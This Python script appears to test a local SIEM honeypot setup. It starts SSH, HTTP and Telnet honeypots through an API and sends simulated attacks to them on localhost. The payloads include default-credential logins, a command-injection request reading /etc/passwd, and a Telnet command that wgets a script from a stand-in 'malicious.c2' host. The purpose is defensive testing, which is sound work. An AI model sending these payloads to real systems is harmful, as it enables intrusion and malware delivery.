import requests
import socket
import time

API_URL = "http://localhost:8000/api/honeypot"

def start_honeypots():
    print("[*] Starting Honeypots via API...")
    try:
        # Start SSH
        r1 = requests.post(f"{API_URL}/start", json={"service": "ssh", "port": 2222})
        print(f"  SSH: {r1.json()}")
        # Start HTTP
        r2 = requests.post(f"{API_URL}/start", json={"service": "http", "port": 8888})
        print(f"  HTTP: {r2.json()}")
        # Start Telnet
        r3 = requests.post(f"{API_URL}/start", json={"service": "telnet", "port": 2323})
        print(f"  Telnet: {r3.json()}")
    except Exception as e:
        print(f"[!] Failed to start honeypots: {e}")
        print("[!] Make sure the SIEM backend is running on port 8000!")

def attack_ssh():
    print("\n[*] Launching SSH Honeypot Attack (Port 2222)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', 2222))
        banner = s.recv(1024)
        print(f"  Received banner: {banner.decode().strip()}")
        # Send fake credentials
        payload = "USER root\nPASS admin123\n"
        print(f"  Sending payload: {payload.strip()}")
        s.send(payload.encode())
        s.close()
        print("  Attack sent successfully.")
    except Exception as e:
        print(f"  [!] Attack failed: {e}")

def attack_http():
    print("\n[*] Launching HTTP Honeypot Attack (Port 8888)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', 8888))
        payload = (
            "GET /admin/config.php?cmd=cat+/etc/passwd HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "User-Agent: sqlmap/1.5.2#dev (http://sqlmap.org)\r\n"
            "Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n"
        )
        print("  Sending HTTP Exploit Payload (SQLMap / Command Injection)...")
        s.send(payload.encode())
        resp = s.recv(1024)
        s.close()
        print(f"  Received response: {resp.decode().splitlines()[0]}")
    except Exception as e:
        print(f"  [!] Attack failed: {e}")

def attack_telnet():
    print("\n[*] Launching Telnet Honeypot Attack (Port 2323)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', 2323))
        payload = "admin\n123456\nls -la; wget http://malicious.c2/malware.sh\n"
        print("  Sending Telnet Brute Force + Malware Download payload...")
        s.send(payload.encode())
        s.close()
        print("  Attack sent successfully.")
    except Exception as e:
        print(f"  [!] Attack failed: {e}")

if __name__ == "__main__":
    start_honeypots()
    time.sleep(2)  # Give them a second to bind
    attack_ssh()
    attack_http()
    attack_telnet()
    print("\n[*] All attacks complete! Check the backend logs or dashboard for Honeypot captures.")
